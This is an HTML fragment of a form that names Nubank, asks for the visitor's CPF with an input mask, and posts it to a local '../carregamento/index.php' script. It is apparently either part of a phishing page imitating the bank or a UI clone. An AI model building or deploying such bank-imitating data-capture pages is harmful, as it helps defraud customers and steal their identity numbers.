            <div class="texto">
                <h3>Qual seu CPF?</h3>
                <p>Ele é usado como sua principal identificação no Nubank.</p>
            </div>

            <div class="input">
                <form method="POST" action="../carregamento/index.php">
                    <input maxlength="14" onkeypress="mascaraa(this)" type="numeric" name="cpf" placeholder="XXX.XXX.XXX-XX"/>
                
            </div>

            <footer>
                <input type="submit" value="CONTINUAR" >
            </form>
            </footer>
        </div>

<script>
    function mascaraa(telefone){ 
            if(telefone.value.length == 3)
                telefone.value =  telefone.value + '.' ; 
            if(telefone.value.length == 7)
                telefone.value =  telefone.value + '.' ; 
 
            if(telefone.value.length == 11)
                telefone.value =  telefone.value + '-' ; 
  
}
</script>
